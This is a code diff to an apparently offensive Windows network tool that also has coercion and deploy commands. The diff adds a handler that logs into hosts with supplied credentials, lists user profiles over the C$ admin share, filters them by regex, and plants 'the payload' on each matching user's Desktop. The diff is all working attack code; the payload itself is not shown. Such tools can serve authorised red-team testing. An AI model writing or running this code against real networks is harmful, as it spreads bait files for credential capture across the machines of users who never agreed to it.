@@ -433,6 +433,92 @@ def handle_coerce(args, credentials):
     )
 
 
+def handle_target_sessions(args, credentials):
+    """Per-host: enumerate real users under C$\\Users, regex-filter, and
+    drop the payload in each matching user's Desktop. Optionally drop in
+    Users\\Public\\Desktop. Delegates to handle_deploy so every deploy
+    flag behaves identically.
+    """
+    import re
+    from linksiren.target import _enumerate_user_desktops, HostTarget
+
+    logger = logging.getLogger("main_logger")
+
+    pattern_strings = [args.users]
+    if getattr(args, "users_file", None):
+        try:
+            with open(args.users_file, encoding="utf-8") as f:
+                for ln in f:
+                    ln = ln.strip()
+                    if ln and not ln.startswith("#"):
+                        pattern_strings.append(ln)
+        except FileNotFoundError:
+            print(f"error: --users-file {args.users_file!r} not found", file=sys.stderr)
+            sys.exit(2)
+    try:
+        patterns = [re.compile(p, re.IGNORECASE) for p in pattern_strings]
+    except re.error as e:
+        print(f"error: bad regex in --users / --users-file: {e}", file=sys.stderr)
+        sys.exit(2)
+
+    hosts = read_targets(args.targets)
+    expanded = []
+    per_host_users = {}
+    for ht in hosts:
+        ht.connect(credentials)
+        if ht.connection is None:
+            logger.warning(
+                "target-sessions: could not connect to host; skipping.",
+                extra={"path": f"\\\\{ht.host}"},
+            )
+            continue
+        desktop_paths = _enumerate_user_desktops(
+            ht.connection, patterns,
+            include_public=getattr(args, "public_desktop", False), logger=logger,
+        )
+        if not desktop_paths:
+            logger.info(
+                "target-sessions: no matching user desktops on host.",
+                extra={"path": f"\\\\{ht.host}"},
+            )
+            continue
+        expanded.append(HostTarget(host=ht.host, paths=[f"C$\\{p}" for p in desktop_paths]))
+        per_host_users[ht.host] = [
+            p.split("\\")[1] for p in desktop_paths if not p.endswith("Public\\Desktop")
+        ]
+
+    if not expanded:
+        print(
+            "target-sessions: no matching user desktops found on any host "
+            "(check --users regex and that the calling account has C$ access).",
+            file=sys.stderr,
+        )
+        return
+
+    if getattr(args, "json_output", False):
+        print(json.dumps({
+            "mode": "target-sessions",
+            "host_count": len(expanded),
+            "desktop_count": sum(len(t.paths) for t in expanded),
+            "users_by_host": per_host_users,
+        }))
+
+    import tempfile
+    with tempfile.NamedTemporaryFile(
+        mode="w", suffix=".target-sessions.txt", delete=False, encoding="utf-8",
+    ) as f:
+        for t in expanded:
+            for p in t.paths:
+                f.write(f"\\\\{t.host}\\{p}\n")
+        args.targets = f.name
+    handle_deploy(args, credentials)
+    logger.info(
+        f"target-sessions: wrote to {sum(len(t.paths) for t in expanded)} "
+        f"desktop(s) across {len(expanded)} host(s).",
+        extra={"path": None},
+    )
+
+
 def handle_discover(args, credentials):
     """Enumerate computer objects from AD via LDAP; emit a targets file.
 
